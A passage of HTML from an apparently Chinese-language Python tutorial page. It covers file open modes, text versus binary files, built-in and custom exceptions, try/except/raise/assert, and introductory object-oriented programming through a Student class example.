style=\"text-align:right\">说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:right\">r</td>\n<td style=\"text-align:right\">只读</td>\n<td style=\"text-align:right\">默认模式，如果文件不存在就报错，存在就正常读取。</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">w</td>\n<td style=\"text-align:right\">只写</td>\n<td style=\"text-align:right\">如果文件不存在，新建文件然后写入；如果存在，先清空文件内容，再写入。</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">a</td>\n<td style=\"text-align:right\">追加</td>\n<td style=\"text-align:right\">如果文件不存在，新建文件，然后写入；如果存在，在文件的最后追加写入。</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">x</td>\n<td style=\"text-align:right\">新建</td>\n<td style=\"text-align:right\">如果文件存在则报错，如果不存在就新建文件，然后写入内容，比 w 模式更安全。</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">b</td>\n<td style=\"text-align:right\">二进制模式</td>\n<td style=\"text-align:right\">比如 rb、wb、ab，以 bytes 类型操作数据</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">+</td>\n<td style=\"text-align:right\">读写模式</td>\n<td style=\"text-align:right\">比如 r+、w+、a+</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"文本文件和二进制文件的差异和区别\"><a class=\"anchor\" href=\"#文本文件和二进制文件的差异和区别\">#</a> 文本文件和二进制文件的差异和区别</h2>\n<p>详细见：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9hZjBiNGY4YjAzMGU=\">https://www.jianshu.com/p/af0b4f8b030e</span></p>\n<p>1、不管什么文件，物理存储都是二进制数据。（计算机对他们读取方式是有区别的。要详细了解他们的区别，比较复杂，这里就不去考虑的这么具体）</p>\n<p>2、两者  能存储的数据类型不同：</p>\n<p>a、文本文件只能存储 char 型字符变量。（每条数据都是固定长度的）</p>\n<p>b、二进制文件可以存储 char/int/short/long/float/…… 各种变量值。（进制文件每条数据不固定）</p>\n<p>怎么理解一条数据呢： char 型字符，就是每一个字符就是一条数据。而 int 型字符，就是一个数字就是一条数据。比如：数字 11，使用 char 型编码会把它 分成 两个字符 1，分别编码。而 int 型就是把它当成一个数字编码。</p>\n<h1 id=\"异常处理\"><a class=\"anchor\" href=\"#异常处理\">#</a> 异常处理</h1>\n<h2 id=\"常见的异常基类\"><a class=\"anchor\" href=\"#常见的异常基类\">#</a> 常见的异常基类</h2>\n<p>BaseException: 所有异常的基类 都是这个类派生的</p>\n<p>Exception: 常规错误的基类</p>\n<p>ZeroDivisionError: 除（或取模）零（所有数据类型）</p>\n<p>AssertionError: 断言语句失败</p>\n<p>AttributeError: 对象没有这个属性</p>\n<p>ImportError: 导入模块 / 对象失败</p>\n<p>LookupError: 无效数据查询的基类</p>\n<p>IndexError: 序列中没有此索引（index）</p>\n<p>KeyError: 映射中没有这个键</p>\n<p>NameError: 未声明 / 初始化对象（没有属性）</p>\n<p>SyntaxError:python 语法错误</p>\n<p>IndentationError: 缩进错误</p>\n<p>TypeError: 传入无效的参数</p>\n<p>UnicodeError:Unicode 相关的错误</p>\n<p>UnicodeDecodeError:Unicode 解码时的错误</p>\n<p>UnicodeEncodeError:Unicode 编码时的错误</p>\n<p>UnicodeTranslateError:Unicode 转换时的错误</p>\n<p>Warning: 警告的基类</p>\n<p>SyntaxWarning: 可疑的语法的警告</p>\n<p>转载自：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NDkxMzc2L2FydGljbGUvZGV0YWlscy8xMDY3NjA0MjA=\">https://blog.csdn.net/qq_38491376/article/details/106760420</span></p>\n<p>内置异常已经够用了，但是有时候你还是需要自定义一些异常。自定义异常应该继承 Exception 类，直接继承或者间接继承都可以，例如:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">MyExcept</span><span class=\"token punctuation\">(</span>Exception<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        self<span class=\"token punctuation\">.</span>message <span class=\"token operator\">=</span> msg</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__str__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>message</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">raise</span> MyExcept<span class=\"token punctuation\">(</span><span class=\"token string\">'我的异常!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">except</span> MyExcept <span class=\"token keyword\">as</span> ex<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ex<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>异常的名字都以 Error 结尾，我们在为自定义异常命名的时候也需要遵守这一规范，就跟标准的异常命名一样。</p>\n<h2 id=\"异常的处理方式\"><a class=\"anchor\" href=\"#异常的处理方式\">#</a> 异常的处理方式</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#捕获异常</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    指令</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">except</span> 【（异常类型）】<span class=\"token punctuation\">:</span>  <span class=\"token comment\">#不加括号为捕获所有异常</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    异常处理程序</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    正确处理程序</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">finally</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    无论是否有异常发生，都执行<span class=\"token keyword\">finally</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>也可</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">except</span> 异常对象 <span class=\"token keyword\">as</span> e <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span>输出报错信息</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>断言(assert)</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>确保程序执行到某个阶段必须符合一定条件，如果不符合，则抛出异常，程序终止同时打印出异常原因</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    assert 条件 , '字符串' #报错的信息</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    条件响应为True则程序不理会逗号右边的字符串，将往下继续执行</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    条件响应为False，则程序终止，并将字符串输出到Traceback的字符串中</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>停用断言</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>想要停用断言，可以在Windows的操作命令提示符，执行程序的时候使用“ -O ” 选项停用断言</pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>主动抛出异常：raise</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>很多时候，我们需要主动抛出一个异常。Python内置了一个关键字raise，可以主动触发异常。</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">raise</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  File <span class=\"token string\">\"&lt;pyshell#0>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">raise</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>RuntimeError<span class=\"token punctuation\">:</span> No active exception to reraise</pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">raise</span> NameError<span class=\"token punctuation\">(</span><span class=\"token string\">\"kkk\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  File <span class=\"token string\">\"&lt;pyshell#1>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">raise</span> NameError<span class=\"token punctuation\">(</span><span class=\"token string\">\"kkk\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>NameError<span class=\"token punctuation\">:</span> kkk</pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">raise</span>唯一的一个参数指定了要被抛出的异常的实例，如果什么参数都不给，那么会默认抛出当前异常。</pre></td></tr></table></figure><h2 id=\"异常与错误的区别\"><a class=\"anchor\" href=\"#异常与错误的区别\">#</a> 异常与错误的区别</h2>\n<p>详细见：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p4ODcwMTIxMjA5L2FydGljbGUvZGV0YWlscy84MTQ3NzMyOQ==\">https://blog.csdn.net/zx870121209/article/details/81477329</span></p>\n<p>错误是无法通过其他代码进行处理问题，如语法错误和逻辑错误，语法错误是单词或格式等写错，只能根据系统提示去修改相应的代码，逻辑错误是代码实现功能的逻辑有问题，系统不会报错，也是只能找到相应的代码进行修改；</p>\n<p>异常是程序执行过程中，出现的未知问题，这里语法和逻辑都是正确的，可以通过其他代码进行处理修复，如可以通过 if 判定语句来避免对年龄进行赋值时输入了字符而出现异常的情况，如使用捕捉异常可以避免除零异常等</p>\n<h1 id=\"python面向对象\"><a class=\"anchor\" href=\"#python面向对象\">#</a> Python 面向对象</h1>\n<p>面向对象编程：Object Oriented Programming，简称 OOP，是一种程序设计方法。OOP 把对象作为程序的基本单元，一个对象包含了数据和操作数据的方法。Python 就是一种面向对象的语言，支持面向对象编程，在其内部，一切都被视作对象。</p>\n<p>面向过程的程序设计把计算机程序视为一系列的命令集合，即一组函数的顺序执行。为了简化程序设计，面向过程把函数继续切分为子函数，即把大块函数通过切割成小块函数来降低系统的复杂度。</p>\n<p>而面向对象的程序设计把计算机程序视为一组对象的集合，而每个对象都可以接收其他对象发过来的消息，并处理这些消息，计算机程序的执行就是一系列消息在各个对象之间传递。</p>\n<p>在 Python 中，所有数据类型都可以视为对象，当然也可以自定义对象。自定义的对象数据类型就是面向对象中的类（Class）的概念。</p>\n<p>数据封装、继承和多态是面向对象的三大特点</p>\n<p>一个对象的特征也称为属性（attribute）。它所具有的行为也称为方法（method）</p>\n<h2 id=\"概念及术语\"><a class=\"anchor\" href=\"#概念及术语\">#</a> 概念及术语：</h2>\n<ul>\n<li>类 (Class): 用来描述具有相同属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。其中的对象被称作类的实例。\n<ul>\n<li>实例：也称对象。通过类定义的初始化方法，赋予具体的值，成为一个 &quot;有血有肉的实体&quot;。</li>\n<li>实例化：创建类的实例的过程或操作。</li>\n<li>实例变量：定义在实例中的变量，只作用于当前实例。</li>\n<li>类变量：类变量是所有实例公有的变量。类变量定义在类中，但在方法体之外。</li>\n<li>数据成员：类变量、实例变量、方法、类方法、静态方法和属性等的统称。</li>\n<li>方法：类中定义的函数。</li>\n<li>静态方法：不需要实例化就可以由类执行的方法</li>\n<li>类方法：类方法是将类本身作为对象进行操作的方法。</li>\n<li>方法重写：如果从父类继承的方法不能满足子类的需求，可以对父类的方法进行改写，这个过程也称 override。</li>\n<li>封装：将内部实现包裹起来，对外透明，提供 api 接口进行调用的机制</li>\n<li>继承：即一个派生类（derived class）继承父类（base class）的变量和方法。</li>\n<li>多态：根据对象类型的不同以不同的方式进行处理。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"类与实例\"><a class=\"anchor\" href=\"#类与实例\">#</a> 类与实例</h2>\n<p>详细见：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGlhb3h1ZWZlbmcuY29tL3dpa2kvMTAxNjk1OTY2MzYwMjQwMC8xMDE3NDk2MDMxMTg1NDA4\">https://www.liaoxuefeng.com/wiki/1016959663602400/1017496031185408</span></p>\n<p>面向对象最重要的概念就是类（Class）和实例（Instance），必须牢记类是抽象的模板，比如 Student 类，而实例是根据类创建出来的一个个具体的 “对象”，每个对象都拥有相同的方法，但各自的数据可能不同。</p>\n<p>仍以 Student 类为例，在 Python 中，定义类是通过 class 关键字：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Student</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">pass</span></pre></td></tr></table></figure><p>class 后面紧接着是类名，即 Student，类名通常是大写开头的单词，紧接着是 (object)，表示该类是从哪个类继承下来的，继承的概念我们后面再讲，通常，如果没有合适的继承类，就使用 object 类，这是所有类最终都会继承的类。</p>\n<p>定义好了 Student 类，就可以根据 Student 类创建出 Student 的实例，创建实例是通过类名 +() 实现的：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> bart <span class=\"token operator\">=</span> Student<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> bart</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">&lt;</span>__main__<span class=\"token punctuation\">.</span>Student <span class=\"token builtin\">object</span> at <span class=\"token number\">0x10a67a590</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> Student</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'__main__.Student'</span><span class=\"token operator\">></span></pre></td></tr></table></figure><p>可以看到，变量 bart 指向的就是一个 Student 的实例，后面的 0x10a67a590 是内存地址，每个 object 的地址都不一样，而 Student 本身则是一个类。</p>\n<p>可以自由地给一个实例变量绑定属性，比如，给实例 bart 绑定一个 name 属性：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> bart<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> <span class=\"token string\">'Bart Simpson'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> bart<span class=\"token punctuation\">.</span>name</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token string\">'Bart Simpson'</span></pre></td></tr></table></figure><p>由于类可以起到模板的作用，因此，可以在创建实例的时候，把一些我们认为必须绑定的属性强制填写进去。通过定义一个特殊的__init__方法，在创建实例的时候，就把 name，score 等属性绑上去：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Student</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> score<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        self<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        self<span class=\"token punctuation\">.</span>score <span class=\"token operator\">=</span> score</pre></td></tr></table></figure><p>注意：特殊方法 “<strong>init</strong>” 前后分别有两个下划线！！！<br />\n注意到__init__方法的第一个参数永远是 self，表示创建的实例本身，因此，在__init__方法内部，就可以把各种属性绑定到 self，因为 self 就指向创建的实例本身。</p>\n<p>有了__init__方法，在创建实例的时候，就不能传入空的参数了，必须传入与__init__方法匹配的参数，但 self 不需要传，Python 解释器自己会把实例变量传进去：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> bart <span class=\"token operator\">=</span> Student<span class=\"token punctuation\">(</span><span class=\"token string\">'Bart Simpson'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">59</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> bart<span class=\"token punctuation\">.</span>name</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token string\">'Bart Simpson'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> bart<span class=\"token punctuation\">.</span>score</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">59</span></pre></td></tr></table></figure><p>和普通的函数相比，在类中定义的函数只有一点不同，就是第一个参数永远是实例变量 self，并且，调用时，不用传递该参数。除此之外，类的方法和普通函数没有什么区别，所以，你仍然可以用默认参数、可变参数、关键字参数和命名关键字参数。</p>\n<p>数据封装<br />\n面向对象编程的一个重要特点就是数据封装。在上面的 Student 类中，每个实例就拥有各自的 name 和 score 这些数据。我们可以通过函数来访问这些数据，比如打印一个学生的成绩：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">print_score</span><span class=\"token punctuation\">(</span>std<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>     <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'%s: %s'</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>std<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span> std<span class=\"token punctuation\">.</span>score<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> print_score<span class=\"token punctuation\">(</span>bart<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Bart Simpson<span class=\"token punctuation\">:</span> <span class=\"token number\">59</span></pre></td></tr></table></figure><p>但是，既然 Student 实例本身就拥有这些数据，要访问这些数据，就没有必要从外面的函数去访问，可以直接在 Student 类的内部定义访问数据的函数，这样，就把 “数据” 给封装起来了。这些封装数据的函数是和 Student 类本身是关联起来的，我们称之为类的方法：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Student</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> score<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        self<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        self<span class=\"token punctuation\">.</span>score <span class=\"token operator\">=</span> score</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">print_score</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'%s: %s'</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>score<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>要定义一个方法，除了第一个参数是 self 外，其他和普通函数一样。要调用一个方法，只需要在实例变量上直接调用，除了 self 不用传递，其他参数正常传入：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> bart<span class=\"token punctuation\">.</span>print_score<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Bart Simpson<span class=\"token punctuation\">:</span> <span class=\"token number\">59</span></pre></td></tr></table></figure><p>这样一来，我们从外部看 Student 类，就只需要知道，创建实例需要给出 name 和 score，而如何打印，都是在 Student 类的内部定义的，这些数据和逻辑被 “封装” 起来了，调用很容易，但却不用知道内部实现的细节。</p>\n<p>封装的另一个好处是可以给 Student 类增加新的方法，比如 get_grade：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Student</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">get_grade</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>score <span class=\"token operator\">>=</span> <span class=\"token number\">90</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token string\">'A'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">elif</span> self<span class=\"token punctuation\">.</span>score <span class=\"token operator\">>=</span> <span class=\"token number\">60</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token string\">'B'</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token string\">'C'</span></pre></td></tr></table></figure><p>同样的，get_grade 方法可以直接在实例变量上调用，不需要知道内部实现细节：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Student</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> score<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        self<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        self<span class=\"token punctuation\">.</span>score <span class=\"token operator\">=</span> score</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">get_grade</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>score <span class=\"token operator\">>=</span> <span class=\"token number\">90</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token string\">'A'</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">elif</span> self<span class=\"token punctuation\">.</span>score <span class=\"token operator\">>=</span> <span class=\"token number\">60</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token string\">'B'</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token string\">'C'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>lisa <span class=\"token operator\">=</span> Student<span class=\"token punctuation\">(</span><span class=\"token string\">'Lisa'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>bart <span class=\"token operator\">=</span> Student<span class=\"token punctuation\">(</span><span class=\"token string\">'Bart'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">59</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>lisa<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span> lisa<span class=\"token punctuation\">.</span>get_grade<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>bart<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span> bart<span class=\"token 